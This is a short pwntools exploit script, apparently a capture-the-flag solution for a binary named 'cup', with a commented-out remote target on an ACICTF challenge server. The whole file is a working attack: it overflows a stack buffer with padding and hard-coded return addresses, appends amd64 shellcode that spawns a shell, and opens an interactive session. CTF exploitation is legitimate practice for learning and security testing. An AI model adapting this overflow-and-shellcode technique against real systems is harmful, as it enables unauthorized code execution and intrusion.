#!/usr/bin/python3

from pwn import *

target = './cup'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================


#==========================================================
#           CODE
#==========================================================

p = process(target)#, env={"LD_PRELOAD":"libc.so.6"})

#p = remote('challenge.acictf.com',28950)

sc = shellcraft.amd64.linux.sh()
sc = asm(sc, arch='amd64', os='linux')

pl = b'\x41' * 0x68
pl += p64(0x40068a)
pl += p64(0x0)
pl += p64(0x400827)
pl += sc

#gdb.attach(p)

print(p.recvuntil('(leave)'))
p.sendline(pl)

print(p.recvuntil('now'))
p.send('\0')

print(p.recvuntil('(leave)'))
p.sendline('-1')

p.interactive()
